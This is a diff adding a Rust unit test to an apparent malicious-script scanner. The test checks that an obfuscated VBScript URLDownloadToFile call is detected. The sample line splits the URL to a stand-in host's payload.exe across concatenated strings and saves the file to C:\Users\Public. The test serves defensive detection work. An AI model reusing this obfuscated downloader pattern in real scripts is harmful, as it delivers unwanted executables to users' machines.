@@ -9412,6 +9412,26 @@ URLDownloadToFile 0, u, "C:\Users\Public\payload.exe", 0, 0"#;
     }
 
     #[test]
+    fn vbs_urldownloadtofile_url_extracted_from_inline_expression() {
+        let mut env = Environment::new(&Config::default());
+        let vbs = br#"URLDownloadToFile 0, "ht" & "tp://vbs-urlmon-expr.example/payload.exe", "C:\Users\Public\" & "payload.exe", 0, 0"#;
+        env.all_extracted_vbs.push(vbs.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://vbs-urlmon-expr.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\payload.exe")
+            )
+        });
+        assert!(
+            has,
+            "no Download trait with destination from URLDownloadToFile expression URL: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn vbs_response_redirect_emits_url_launch() {
         let mut env = Environment::new(&Config::default());
         let vbs = br#"Response.Redirect "https://vbs-redirect.example/panel""#;
